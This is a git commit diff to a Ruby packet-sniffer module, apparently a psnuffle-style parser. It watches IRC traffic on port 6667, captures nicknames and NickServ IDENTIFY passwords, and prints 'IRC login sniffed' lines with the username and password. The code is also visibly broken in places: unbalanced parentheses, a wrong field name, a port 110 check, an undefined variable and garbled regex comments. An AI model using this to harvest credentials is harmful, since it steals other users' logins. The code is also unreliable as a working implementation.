825d99ab84ad801c0303b8cf6f9d31002d230850
Gbenga Ojo <gbenga@gbengaojo.com>
2019-02-17 23:06:23 -0600

    handle regex matches

--- mtf/modules/psnuffle/freenode.nickserver.rb
+++ mtf/modules/psnuffle/freenode.nickserver.rb
@@ -19,7 +19,7 @@ class SnifferFreenodeNick < BaseProtocolParser
     return unless pkt.is_tcp?
     return if (pkt.tcp_sport != 6667 and pkt.tcp_port != 6667
 
-    # Ensure that the session hash stays the same for during communication in
+    # Ensure that the session hash stays the same during communication in
     # both directions
     s = find_session(pkt.tcp_sport == 110) ? get_session_src(pkt) : get_session_dst(pkt))
 
@@ -34,7 +34,19 @@ class SnifferFreenodeNick < BaseProtocolParser
     end
 
     case matched
-
+      when :user # when the pattern "/^NICKs+[^n]+)/si matches the packet content...
+        s[:user] = matches # store the name into the session hash s for later use
+        # Do whatever you like here. Maybe a puts..
+      when :pass # when the pattern "/b(IDENTIFYs+[^n]+)/si" is matching...
+        s[:pass] = matches # store the password into the session hash s also
+        if (s[:user] and s[:pass]) # when we have the name and pass sniffed, print it
+          print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}\n"
+        end
+        sessions.delete(s[:session]) # Remove this session b/c we dont need to track it anymore 
+      when nil
+        # No matches, don't do anything else
+        # Just in case anything else is matching...
+        sessions[s[:session]].merge!({k => matches}) # Just add it to the session object
     end
   end
 
